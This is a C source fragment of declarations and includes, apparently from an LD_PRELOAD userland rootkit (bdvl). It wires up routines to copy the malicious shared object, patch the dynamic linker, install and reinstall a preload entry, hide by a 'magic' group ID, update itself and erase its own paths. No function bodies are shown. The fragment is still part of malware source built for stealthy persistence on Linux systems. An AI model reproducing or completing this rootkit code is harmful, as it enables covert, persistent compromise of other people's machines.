char *sogetplatform(char *sopath);
char *sogetpath(char *sopath, char *installdir, char *bdvlso);
int socopy(const char *opath, char *npath, gid_t magicgid);
#include "so.c"

#include "ldpatch/ldpatch.h"


void eradicatedir(const char *target);
#ifdef UNINSTALL_MY_ASS
void uninstallass(void);
#endif
void rmbdvpaths(void);
void uninstallbdv(void);
#include "uninstall.c"

int rknomore(char *installdir, char *bdvlso);
int _preloadok(const char *preloadpath);
int preloadok(const char *preloadpath);
void reinstall(const char *preloadpath, char *installdir, char *bdvlso);
#include "reinstall.c"

void bdvinstall(char *const argv[], char *installdir, char *bdvlso, char *preloadpath, gid_t magicgid);
#include "install.c"


static char *const marknames[5] = {"BDVLSO:", "INSTALL_DIR:", "OLD_PRELOAD:", "PRELOAD_FILE:", NULL};
char **findsettings(const char *sopath, int *cm);
void bdvupdate(char *const argv[]);
#include "update.c"